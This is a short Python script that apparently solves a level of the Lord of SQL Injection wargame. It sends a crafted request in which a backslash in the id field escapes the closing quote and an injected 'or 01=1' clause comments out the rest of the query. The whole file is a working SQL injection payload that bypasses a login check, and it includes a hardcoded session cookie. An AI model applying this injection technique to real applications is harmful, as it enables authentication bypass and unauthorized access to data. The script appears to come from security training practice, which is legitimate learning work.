#!/usr/bin/env python3

'''
# Summary
- We can make ' as a STR (\') using \ (backslash)
'''


import requests

header = {"Cookie": "PHPSESSID=o586di4n9l2qha4q6pkpvria5f;"}
url = "https://los.rubiya.kr/chall/succubus_37568a99f12e6bd2f097e8038f74d768.php"

payload = "?id=\&pw= or 01=1%23"

response = requests.get(url + payload, headers=header)

result = response.text
if result.find("Clear!") != -1:
    end = result.split("Clear!")[0].split("<h2>")[1]
    if end.find("admin") != -1:
        end = result.split("Clear!")[0].split("<h2>")[2]
    print(end+"Clear!")